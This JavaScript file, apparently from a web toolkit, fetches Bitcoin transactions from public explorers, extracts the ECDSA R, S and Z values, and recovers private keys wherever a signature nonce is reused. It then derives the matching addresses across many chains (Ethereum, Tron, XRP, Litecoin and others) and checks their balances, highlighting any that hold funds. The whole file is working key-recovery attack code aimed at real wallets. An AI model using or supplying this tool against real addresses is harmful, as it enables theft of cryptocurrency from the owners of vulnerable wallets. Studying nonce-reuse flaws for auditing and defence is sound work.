/*
 * TXID -> R, S, Z, Address + Private Key Recovery (R-Reuse)
 * Engine extracted from the CryptographyTube Tools collection (tool #1).
 * Self-contained: depends only on CryptoJS (crypto-js) which is loaded
 * before this file. Exposes window.processTxid() and window.exportOne().
 *
 * How it works: given a Bitcoin TXID (or address), it fetches the raw
 * transaction, reconstructs the ECDSA signature components (R, S, Z) for
 * each input, and — if two inputs reuse the same R value with different S —
 * algebraically recovers the private key (nonce-reuse vulnerability).
 */
(function () {
    "use strict";

    // ---- Constants -------------------------------------------------------
    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

    const BLOCKCHAIN_API_KEYS = [
        "51c6e11c-1c5c-4c6e-8e8e-8e8e8e8e8e8e",
        "a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d",
        "9e8d7c6b-5a4f-3e2d-1c0b-9a8f7e6d5c4b",
        "f1e2d3c4-b5a6-9d8c-7b6a-5f4e3d2c1b0a",
        "0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d"
    ];

    // ---- Low-level converters -------------------------------------------
    function hexToBytes(hex) {
        if (!hex || typeof hex !== 'string') return new Uint8Array();
        if (hex.length % 2 !== 0) hex = '0' + hex;
        const matches = hex.match(/.{1,2}/g);
        if (!matches) return new Uint8Array();
        return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
    }
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function hexToBigInt(hex) { return BigInt('0x' + hex); }

    function reverseHex(hex) {
        if (hex.length % 2 !== 0) throw new Error("Hex string length is odd.");
        return hex.match(/.{1,2}/g).reverse().join('');
    }

    function readVarInt(buf, offset) {
        let prefix = buf[offset];
        if (prefix < 0xFD) return { val: prefix, size: 1 };
        if (prefix === 0xFD) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8);
            return { val: val, size: 3 };
        }
        if (prefix === 0xFE) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8) | (buf[offset + 3] << 16) | (buf[offset + 4] << 24);
            return { val: val, size: 5 };
        }
        return { val: buf[offset + 1], size: 9 };
    }

    // ---- Math ------------------------------------------------------------
    function modInverse(a, m) {
        if (a === 0n) throw new Error("Division by zero (no modular inverse)");
        let m0 = m;
        let x0 = 0n;
        let x1 = 1n;
        a %= m;

        while (a > 1n) {
            if (m === 0n) throw new Error("Modular inverse does not exist");
            let q = a / m;
            let t = m;

            m = a % m;
            a = t;

            t = x0;
            x0 = x1 - q * x0;
            x1 = t;
        }

        if (a === 0n) throw new Error("Modular inverse does not exist");

        if (x1 < 0n) {
            x1 += m0;
        }
        return x1;
    }

    // ---- Hashing (CryptoJS) ---------------------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }

    // ---- Base58 / address ------------------------------------------------
    function b58encode(hex) {
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) {
            str = ALPHABET[Number(num % 58n)] + str;
            num /= 58n;
        }
        for (let i = 0; i < hex.length; i += 2) {
            if (hex.substring(i, i + 2) === "00") str = "1" + str;
            else break;
        }
        return str;
    }

    function hash160ToAddress(hash160, version_byte) {
        const versioned_hash_hex = version_byte + hash160;
        const versioned_hash_bytes = CryptoJS.enc.Hex.parse(versioned_hash_hex);
        const checksum = CryptoJS.SHA256(CryptoJS.SHA256(versioned_hash_bytes)).toString().substring(0, 8);
        return b58encode(versioned_hash_hex + checksum);
    }

    function pubToAddr_P2PKH(pub_hex) {
        const pub_bin = hexToBytes(pub_hex);
        const sha256_hash = sha256hex(bytesToHex(pub_bin));
        const ripemd160_hash = ripe160hex(sha256_hash);
        return hash160ToAddress(ripemd160_hash, "00");
    }

    // ---- Multi-chain: a recovered secp256k1 key derives addresses on every
    //      secp256k1-based chain (Bitcoin-family P2PKH, EVM + TRON via keccak-256,
    //      XRP via hash160 + the XRP base58 alphabet). ----------------------
    const XRP_ALPHABET = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz";
    var CHAINS = {
        bitcoin:        { name: 'Bitcoin',      kind: 'p2pkh',   version: '00' },
        ethereum:       { name: 'Ethereum',     kind: 'evm' },
        bnb:            { name: 'BNB Chain',    kind: 'evm' },
        arbitrum:       { name: 'Arbitrum',     kind: 'evm' },
        optimism:       { name: 'Optimism',     kind: 'evm' },
        base:           { name: 'Base',         kind: 'evm' },
        polygon:        { name: 'Polygon',      kind: 'evm' },
        avalanche:      { name: 'Avalanche',    kind: 'evm' },
        zksync:         { name: 'zkSync Era',   kind: 'evm' },
        solana:         { name: 'Solana',       kind: 'ed25519' },
        tron:           { name: 'Tron',         kind: 'tron' },
        toncoin:        { name: 'TON',          kind: 'ed25519' },
        sui:            { name: 'Sui',          kind: 'ed25519' },
        xrp:            { name: 'XRP',          kind: 'xrp' },
        litecoin:       { name: 'Litecoin',     kind: 'p2pkh',   version: '30' },
        'bitcoin-cash': { name: 'Bitcoin Cash', kind: 'p2pkh',   version: '00' },
        dogecoin:       { name: 'Dogecoin',     kind: 'p2pkh',   version: '1e' },
        zcash:          { name: 'Zcash',        kind: 'zcash',   version: '1cb8' }
    };
    function chainInfo(c) { return CHAINS[c] || CHAINS.bitcoin; }
    function activeChain() { return (window.TXR_CHAIN || 'bitcoin'); }
    function b58encodeAny(hex, alphabet) {
        var A = alphabet || ALPHABET;
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) { str = A[Number(num % 58n)] + str; num /= 58n; }
        for (let i = 0; i < hex.length; i += 2) {
            if (hex.substring(i, i + 2) === "00") str = A[0] + str;
            else break;
        }
        return str;
    }
    var KECCAK_RC = [0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n, 0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n, 0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an, 0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n, 0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an, 0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n];
    var KECCAK_RHO = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
    var KECCAK_PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
    var M64 = (1n << 64n) - 1n;
    function kRol(x, s) { s = s % 64n; return s === 0n ? x : ((x << s) | (x >> (64n - s))) & M64; }
    function keccakF(a) {
        var B = new Array(25).fill(0n), C = [0n, 0n, 0n, 0n, 0n], x, y, i, t, j, v, D;
        for (var round = 0; round < 24; round++) {
            for (x = 0; x < 5; x++) C[x] = a[x] ^ a[x + 5] ^ a[x + 10] ^ a[x + 15] ^ a[x + 20];
            for (x = 0; x < 5; x++) {
                D = C[(x + 4) % 5] ^ kRol(C[(x + 1) % 5], 1n);
                for (y = 0; y < 5; y++) a[x + 5 * y] ^= D;
            }
            t = a[1];
            for (x = 0; x < 24; x++) {
                j = KECCAK_PILN[x]; v = a[j];
                a[j] = kRol(t, BigInt(KECCAK_RHO[x]));
                t = v;
            }
            for (y = 0; y < 5; y++) {
                for (x = 0; x < 5; x++) B[x + 5 * y] = a[x + 5 * y] ^ ((~a[(x + 1) % 5 + 5 * y]) & a[(x + 2) % 5 + 5 * y]);
            }
            for (i = 0; i < 25; i++) a[i] = B[i];
            a[0] ^= KECCAK_RC[round];
        }
    }
    function keccak256Hex(bytes) {
        var rate = 136, st = new BigUint64Array(25), buf = new Uint8Array(bytes);
        var full = Math.floor(buf.length / rate), b, i, off, k, lane;
        for (b = 0; b < full; b++) {
            for (i = 0; i < rate / 8; i++) {
                off = b * rate + i * 8; lane = 0n;
                for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(buf[off + k]);
                st[i] ^= lane;
            }
            keccakF(st);
        }
        var rem = buf.length - full * rate, last = new Uint8Array(rate);
        last.set(buf.subarray(full * rate));
        last[rem] ^= 0x01; last[rate - 1] ^= 0x80;
        for (i = 0; i < rate / 8; i++) {
            off = i * 8; lane = 0n;
            for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(last[off + k]);
            st[i] ^= lane;
        }
        keccakF(st);
        var out = new Uint8Array(32);
        for (i = 0; i < 4; i++) {
            lane = st[i];
            for (k = 0; k < 8; k++) { out[i * 8 + k] = Number(lane & 0xffn); lane >>= 8n; }
        }
        var hex = "";
        for (i = 0; i < out.length; i++) hex += out[i].toString(16).padStart(2, "0");
        return hex;
    }
    function chainAddressesFromPriv(privHex, c) {
        var d = BigInt("0x" + privHex);
        var Q = sMulMT(d);
        var x = hxMT(Q.x), y = hxMT(Q.y);
        var pk = { cpub: (Q.y & 1n ? "03" : "02") + x, upub: "04" + x + y };
        var info = chainInfo(c);
        if (info.kind === 'p2pkh' || info.kind === 'zcash') {
            return [hash160ToAddress(ripe160hex(sha256hex(pk.cpub)), info.version),
            hash160ToAddress(ripe160hex(sha256hex(pk.upub)), info.version)];
        }
        if (info.kind === 'evm' || info.kind === 'tron') {
            var k = keccak256Hex(bytesOfHex(pk.upub.slice(2))).slice(-40);
            if (info.kind === 'tron') {
                var p = "41" + k;
                return [b58encodeAny(p + sha256hex(sha256hex(p)).substring(0, 8))];
            }
            return ["0x" + k.toLowerCase()];
        }
        if (info.kind === 'xrp') {
            var h = ripe160hex(sha256hex(pk.cpub));
            var px = "00" + h;
            return [b58encodeAny(px + sha256hex(sha256hex(px)).substring(0, 8), XRP_ALPHABET)];
        }
        return [];
    }
    // Main-thread secp256k1 (for deriving the recovered key's addresses).
    const P_MT = (2n ** 256n) - (2n ** 32n) - 977n;
    const GX_MT = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
    const GY_MT = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;
    function mMod(a, m) { const r = a % m; return r < 0n ? r + m : r; }
    function ptAddMT(pp, qp) {
        if (!pp) return qp; if (!qp) return pp;
        if (pp.x === qp.x && mMod(pp.y + qp.y, P_MT) === 0n) return null;
        let l;
        if (pp.x === qp.x && pp.y === qp.y) l = mMod((3n * pp.x * pp.x) * modInverse(2n * pp.y, P_MT), P_MT);
        else l = mMod((qp.y - pp.y) * modInverse(mMod(qp.x - pp.x, P_MT), P_MT), P_MT);
        const x = mMod(l * l - pp.x - qp.x, P_MT);
        return { x: x, y: mMod(l * (pp.x - x) - pp.y, P_MT) };
    }
    function sMulMT(k) {
        k = mMod(k, N); let R = null, A = { x: GX_MT, y: GY_MT };
        while (k > 0n) { if (k & 1n) R = ptAddMT(R, A); A = ptAddMT(A, A); k >>= 1n; }
        return R;
    }
    function hxMT(b) { let s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
    function bytesOfHex(h) {
        var out = new Uint8Array(h.length / 2);
        for (var i = 0; i < out.length; i++) out[i] = parseInt(h.substring(i * 2, i * 2 + 2), 16);
        return out;
    }

    // ---- DER signature parsing ------------------------------------------
    function tryParseDerAt(buf, pos) {
        if (!buf || pos + 7 > buf.length) return null;
        try {
            if (buf[pos] !== 0x30) return null; // SEQUENCE (0x30)

            const total_len = buf[pos + 1];
            if (total_len < 6) return null;
            const end = pos + 2 + total_len;
            if (end > buf.length) return null;

            if (buf[pos + 2] !== 0x02) return null; // INTEGER (R-value)

            const r_len = buf[pos + 3];
            const r_start = pos + 4;
            const r_end = r_start + r_len;
            if (r_end >= buf.length || r_end >= end) return null;

            if (buf[r_end] !== 0x02) return null; // INTEGER (S-value)

            const s_len = buf[r_end + 1];
            const s_start = r_end + 2;
            const s_end = s_start + s_len;
            if (s_end > buf.length || s_end > end) return null;

            const r_bytes = buf.slice(r_start, r_end);
            const s_bytes = buf.slice(s_start, s_end);

            let r_hex = bytesToHex(r_bytes);
            let s_hex = bytesToHex(s_bytes);
            if (r_hex.startsWith('00') && r_hex.length > 2) r_hex = r_hex.substring(2);
            if (s_hex.startsWith('00') && s_hex.length > 2) s_hex = s_hex.substring(2);

            const consumed = end - pos;
            return { r: r_hex, s: s_hex, len: consumed };
        } catch (e) {
            return null;
        }
    }

    function parseDER(hex) {
        try {
            if (hex.endsWith("01") || hex.endsWith("81") || hex.endsWith("02") || hex.endsWith("82") || hex.endsWith("03") || hex.endsWith("83")) {
                hex = hex.substring(0, hex.length - 2); // Remove HashType
            }
            let cursor = 0;
            if (hex.substring(cursor, cursor + 2) !== "30") return {}; cursor += 2;
            cursor += 2; // skip total length

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const rLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let r = hex.substring(cursor, cursor + rLen); cursor += rLen;
            if (r.startsWith("00")) r = r.substring(2);

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const sLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let s = hex.substring(cursor, cursor + sLen);
            if (s.startsWith("00")) s = s.substring(2);

            return { r, s };
        } catch (e) { return {}; }
    }

    function parseScriptSig(scr) {
        const buf = hexToBytes(scr);
        let r = "", s = "", pub = "";

        // Scan for DER signature (P2PKH standard)
        for (let i = 0; i < buf.length - 10; i++) {
            const maybe = tryParseDerAt(buf, i);
            if (maybe) {
                r = maybe.r;
                s = maybe.s;
                let nextPos = i + maybe.len + 1;
                if (nextPos < buf.length) {
                    let pubPushLen = buf[nextPos];
                    if ((pubPushLen === 33 || pubPushLen === 65) && nextPos + 1 + pubPushLen <= buf.length) {
                        pub = bytesToHex(buf.slice(nextPos + 1, nextPos + 1 + pubPushLen));
                        if (!pub.startsWith("02") && !pub.startsWith("03") && !pub.startsWith("04")) pub = "";
                    }
                }
                if (r && s) break;
            }
        }

        // Fallback search for pubkey if not directly after signature
        if (!pub) {
            for (let i = 0; i < buf.length - 33; i++) {
                let len = buf[i];
                if (len === 33 || len === 65) {
                    let potential = bytesToHex(buf.slice(i + 1, i + 1 + len));
                    if (potential.startsWith("02") || potential.startsWith("03") || potential.startsWith("04")) {
                        pub = potential;
                        break;
                    }
                }
            }
        }

        return { r, s, pub };
    }

    // ---- Transaction parsing --------------------------------------------
    function parseHexTransaction(txRaw) {
        const buf = hexToBytes(txRaw);
        let cursor = 0;

        const version = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;

        let isSegwit = false;
        if (buf[cursor] === 0x00 && buf[cursor + 1] === 0x01) {
            isSegwit = true;
            cursor += 2;
        }

        const inCountData = readVarInt(buf, cursor); cursor += inCountData.size;
        const inputs = [];
        for (let i = 0; i < inCountData.val; i++) {
            const pre_raw = bytesToHex(buf.slice(cursor, cursor + 32));
            const vout_raw = bytesToHex(buf.slice(cursor + 32, cursor + 36));
            cursor += 36;
            const scriptLen = readVarInt(buf, cursor); cursor += scriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + scriptLen.val)); cursor += scriptLen.val;
            const seq_raw = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;
            inputs.push({ pre_raw, vout_raw, script_hex, seq_raw });
        }

        const outCountData = readVarInt(buf, cursor); cursor += outCountData.size;
        const outputs = [];
        for (let i = 0; i < outCountData.val; i++) {
            const value_raw = bytesToHex(buf.slice(cursor, cursor + 8)); cursor += 8;
            const outScriptLen = readVarInt(buf, cursor); cursor += outScriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + outScriptLen.val)); cursor += outScriptLen.val;
            outputs.push({ value_raw, script_len_raw: (outScriptLen.size === 1 ? outScriptLen.val.toString(16).padStart(2, '0') : "fd" + reverseHex(outScriptLen.val.toString(16).padStart(4, '0'))), script_hex });
        }

        if (isSegwit) {
            for (let i = 0; i < inCountData.val; i++) {
                const witnessCount = readVarInt(buf, cursor); cursor += witnessCount.size;
                const witnesses = [];
                for (let j = 0; j < witnessCount.val; j++) {
                    const itemLen = readVarInt(buf, cursor); cursor += itemLen.size;
                    witnesses.push(bytesToHex(buf.slice(cursor, cursor + itemLen.val)));
                    cursor += itemLen.val;
                }
                inputs[i].witness = witnesses;
            }
        }

        const locktime_raw = bytesToHex(buf.slice(cursor, cursor + 4));
        return { version, inputs, outputs, locktime_raw, isSegwit };
    }

    function parsingRaw(rawtx) {
        return parseHexTransaction(rawtx);
    }

    function getrsz_v2(fullTx, inputIndex, scriptPubKey) {
        // Legacy SIGHASH_ALL reconstruction
        let e = fullTx.version;
        let inCount = fullTx.inputs.length;
        let inCountHex = (inCount < 253) ? inCount.toString(16).padStart(2, '0') :
            (inCount < 65536) ? "fd" + reverseHex(inCount.toString(16).padStart(4, '0')) :
                "fe" + reverseHex(inCount.toString(16).padStart(8, '0'));

        e += inCountHex;

        for (let i = 0; i < inCount; i++) {
            const inp = fullTx.inputs[i];
            e += inp.pre_raw;
            e += inp.vout_raw;

            if (i === inputIndex) {
                const spk = scriptPubKey || "";
                const spkLen = (spk.length / 2);
                const spkLenHex = (spkLen < 253) ? spkLen.toString(16).padStart(2, '0') :
                    (spkLen < 65536) ? "fd" + reverseHex(spkLen.toString(16).padStart(4, '0')) :
                        "fe" + reverseHex(spkLen.toString(16).padStart(8, '0'));
                e += spkLenHex + spk;
            } else {
                e += "00";
            }
            e += inp.seq_raw;
        }

        // Outputs
        let outCount = fullTx.outputs.length;
        let outCountHex = (outCount < 253) ? outCount.toString(16).padStart(2, '0') : "fd" + reverseHex(outCount.toString(16).padStart(4, '0'));
        e += outCountHex;
        for (let out of fullTx.outputs) {
            e += out.value_raw + out.script_len_raw + out.script_hex;
        }

        e += fullTx.locktime_raw + "01000000"; // SIGHASH_ALL
        return dblsha256(e);
    }

    function getrsz(parsed) {
        const results = [];
        for (let i = 0; i < parsed.inputs.length; i++) {
            const inp = parsed.inputs[i];
            let r, s, pub;

            // 1. Check Legacy scriptSig
            if (inp.script_hex) {
                const sigData = parseScriptSig(inp.script_hex);
                if (sigData.r) {
                    r = sigData.r; s = sigData.s; pub = sigData.pub;
                }
            }

            // 2. Check Segwit Witness (If no legacy sig found)
            if (!r && inp.witness && inp.witness.length >= 2) {
                // In P2WPKH, Witness is [Signature, PubKey]
                const witnessSig = inp.witness[0];
                const witnessPub = inp.witness[1];
                if (witnessSig && witnessPub) {
                    const der = parseDER(witnessSig);
                    if (der.r) {
                        r = der.r; s = der.s; pub = witnessPub;
                    }
                }
            }

            if (!r || !s || !pub) continue;

            const pubHash160 = ripe160hex(sha256hex(pub));
            const scriptPubKey = "76a914" + pubHash160 + "88ac";
            const addr = pubToAddr_P2PKH(pub);

            const z = getrsz_v2(parsed, i, scriptPubKey);

            results.push({
                input_index: i,
                addr: addr,
                r: r,
                s: s,
                z: z,
                pub: pub
            });
        }
        return results;
    }

    // ---- Network ---------------------------------------------------------
    async function getRawTx(txid) {
        if (!txid || txid.length !== 64) throw new Error("Invalid TXID");

        const urls = [
            `https://blockstream.info/api/tx/${txid}/hex`,
            `https://blockchain.info/rawtx/${txid}?format=hex`
        ];

        for (let url of urls) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(6000) });
                if (response.ok) {
                    const rawtx = await response.text();
                    if (rawtx && rawtx.length > 50 && !rawtx.includes("not found") && !rawtx.startsWith("<!DOCTYPE")) {
                        return rawtx.trim();
                    }
                }
            } catch (e) {
                console.warn(`Fallback: Failed to fetch from ${url}. Trying next...`);
            }
            await new Promise(r => setTimeout(r, 300));
        }

        throw new Error(`API Exhaustion: Could not fetch raw TX ${txid.substring(0, 8)}. Please wait a moment and retry.`);
    }

    // List an address's transaction ids, newest first, up to `want`.
    // Primary: blockstream.info Esplora (CORS-friendly, no API key, 25/page, paged
    // by last-seen txid). Fallback: blockchain.info rawaddr (offset paging).
    // Returns an array of txids, [] if the address genuinely has none, or null if
    // every explorer failed (network / CORS / rate-limit) so the caller can warn.
    async function fetchAddressTxids(addr, want, onProgress) {
        let anyOk = false;

        // --- blockstream.info Esplora (primary) ---
        try {
            let txids = [];
            let lastSeen = '';
            let guard = 0;
            while (txids.length < want && guard < 5000) {
                guard++;
                const url = lastSeen
                    ? `https://blockstream.info/api/address/${addr}/txs/chain/${lastSeen}`
                    : `https://blockstream.info/api/address/${addr}/txs/chain`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const arr = await resp.json();
                if (!Array.isArray(arr) || arr.length === 0) break;
                for (const t of arr) txids.push(t.txid);
                lastSeen = arr[arr.length - 1].txid;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: want });
                if (arr.length < 25) break;               // final (short) page
                await new Promise(r => setTimeout(r, 120));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];                          // responded OK but no txs
        } catch (e) { /* fall through to blockchain.info */ }

        // --- blockchain.info rawaddr (fallback) ---
        try {
            let txids = [];
            let total = null;
            let offset = 0;
            const PAGE = 50;                               // rawaddr max per request
            while (txids.length < want) {
                const pageLimit = Math.min(PAGE, want - txids.length);
                const url = `https://blockchain.info/rawaddr/${addr}?limit=${pageLimit}&offset=${offset}&cors=true`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const data = await resp.json();
                if (!data || !Array.isArray(data.txs)) break;
                if (total === null) total = data.n_tx || 0;
                if (data.txs.length === 0) break;
                for (const tx of data.txs) txids.push(tx.hash);
                offset += data.txs.length;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: Math.min(want, total || want) });
                if (total && offset >= total) break;
                if (data.txs.length < pageLimit) break;
                await new Promise(r => setTimeout(r, 150));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { /* both sources failed */ }

        return anyOk ? [] : null;
    }

    async function fetchBlockchainData(addr, want, onProgress) {
        want = Math.max(1, parseInt(want, 10) || 100);
        const results = [];

        // 1) Collect exactly `want` tx ids for the address (capped at what exists).
        const txHashes = await fetchAddressTxids(addr, want, onProgress);
        if (txHashes === null) {
            throw new Error("Couldn't reach a block explorer for this address (it may be rate-limiting). Please wait a few seconds and try again, or lower the count.");
        }
        if (txHashes.length === 0) return results;         // address has no transactions

        // 2) For each tx: fetch raw hex, reconstruct R,S,Z, keep the inputs this
        //    address signed. Small concurrent batches + throttle to dodge rate limits.
        const target = txHashes.length;
        let scanned = 0;
        const BATCH = 4;
        for (let b = 0; b < txHashes.length; b += BATCH) {
            const slice = txHashes.slice(b, b + BATCH);
            const settled = await Promise.all(slice.map(async (h) => {
                try {
                    const raw = await getRawTx(h);
                    const parsed = parsingRaw(raw);
                    const matched = getrsz(parsed).filter(it => it.addr === addr);
                    matched.forEach(it => { it.txid = h; });
                    return matched;
                } catch (e) { return []; }
            }));
            settled.forEach(arr => { for (const it of arr) results.push(it); });
            scanned += slice.length;
            if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: target, found: results.length });
            await new Promise(r => setTimeout(r, 120));
        }
        return results;
    }

    // ---- Address balance / activity stats (same box as Address Analysis) --
    function formatBtc(sats) {
        const n = Number(sats || 0) / 1e8;                 // < 2^53, safe for BTC supply
        const s = n.toFixed(8).replace(/\.?0+$/, '');
        return (s || '0') + ' BTC';
    }

    // Balance / Received / TX for an address. blockstream primary, blockchain.info
    // fallback. Returns {balance, received, tx} (satoshis) or null on total failure.
    async function fetchAddressStats(addr) {
        try {
            const resp = await fetch(`https://blockstream.info/api/address/${addr}`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                const c = d.chain_stats || {};
                const m = d.mempool_stats || {};
                const funded = (c.funded_txo_sum || 0) + (m.funded_txo_sum || 0);
                const spent = (c.spent_txo_sum || 0) + (m.spent_txo_sum || 0);
                const txc = (c.tx_count || 0) + (m.tx_count || 0);
                return { balance: funded - spent, received: funded, tx: txc };
            }
        } catch (e) { /* fall through */ }
        try {
            const resp = await fetch(`https://blockchain.info/rawaddr/${addr}?limit=0&cors=true`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                return { balance: d.final_balance || 0, received: d.total_received || 0, tx: d.n_tx || 0 };
            }
        } catch (e) { /* give up */ }
        return null;
    }

    // Rotating balance-check spinner — the same wheel the Public Key Toolkit /
    // private-keys pages show while an explorer request is in flight. Own class
    // (.txr-spin, not .fa-icon) so the global icon-tint filters never recolour it;
    // it is tinted + spun by tool.css.
    function spinner(size) {
        const n = size || 13;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n +
            '" height="' + n + '" alt="loading">';
    }
    function setStats(stats) {
        const b = document.getElementById('txr-stat-balance');
        const r = document.getElementById('txr-stat-received');
        const t = document.getElementById('txr-stat-tx');
        // Turn the amount green when the address holds (Balance) or has ever held
        // (Received) coins — matching the private-keys balance colour (#22c55e).
        if (b) { b.textContent = stats ? formatBtc(stats.balance) : '0 BTC'; b.classList.toggle('has-balance', !!(stats && stats.balance > 0)); }
        if (r) { r.textContent = stats ? formatBtc(stats.received) : '0 BTC'; r.classList.toggle('has-balance', !!(stats && stats.received > 0)); }
        if (t) t.textContent = stats ? String(stats.tx) : '0';
    }
    // Show the spinner in the Balance / Received / TX boxes while their lookup runs.
    function statLoading() {
        ['txr-stat-balance', 'txr-stat-received', 'txr-stat-tx'].forEach(function (id) {
            const el = document.getElementById(id);
            if (el) { el.innerHTML = spinner(16); el.classList.remove('has-balance'); }
        });
    }

    async function resolveInputToRSZ(input, want, onProgress) {
        if (!input) return [];
        let inText = input.trim();
        // Detect if Address (roughly 26-62 chars, no colons)
        if (inText.length >= 26 && inText.length <= 62 && !inText.includes(':')) {
            return await fetchBlockchainData(inText, want, onProgress);
        }
        // Assume RSZ Bulk format
        return inText.split('\n').map(l => {
            let p = l.split(':');
            if (p.length >= 3) return { r: p[0].trim(), s: p[1].trim(), z: p[2].trim() };
            return null;
        }).filter(it => it && it.r.length > 50);
    }

    // ---- Key recovery ----------------------------------------------------
    function recover_private_key(R, S1, S2, Z1, Z2) {
        try {
            if (S1 === S2) {
                if (Z1 === Z2) {
                    return "ERROR: Identical Signatures. This is a duplicate broadcast/broadcast collision, NOT a solvable R-reuse exploit (requires different Z values).";
                } else {
                    return "ERROR: Critical Fault. Same S but Different Z implies a fundamental cryptographic failure or non-standard signature model.";
                }
            }

            const R_inv = modInverse(R, N);
            const S_diff = (S1 - S2 + N) % N;
            const S_diff_inv = modInverse(S_diff, N);
            const Z_diff = (Z1 - Z2 + N) % N;
            const k = (Z_diff * S_diff_inv) % N;

            const S1k = (S1 * k) % N;
            const S1k_Z1 = (S1k - Z1 + N) % N;
            const d = (S1k_Z1 * R_inv) % N;

            return d.toString(16).padStart(64, '0');
        } catch (e) {
            return "ERROR: " + e.message;
        }
    }

    // ---- Output header + export (de-branded) -----------------------------
    function getOutputHeader(elementId) {
        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">R &middot; S &middot; Z Analysis</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }

    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Waiting for input...") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }

        const section = el.closest('.tool-section');
        const title = section ? (section.querySelector('h3') ? section.querySelector('h3').innerText : "CryptographyTube Result") : "CryptographyTube Result";
        let rawText = el.innerText || el.textContent;

        let headerText = `CRYPTOGRAPHYTUBE REPORT\n`;
        headerText += `TOOL: ${title.toUpperCase()}\n`;
        headerText += `GENERATED: ${new Date().toLocaleString()}\n`;
        headerText += `--------------------------------------------------\n\n`;

        const fullContent = headerText + rawText;

        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `CryptographyTube_Report_${id}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }

    // one mono value + copy button (TXID, recovered key, R/S/Z, pubkey…)
    function monoCell(val, extraCls) {
        return '<code class="rsz-val ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val);
    }
    function rszLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' + monoCell(val) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }

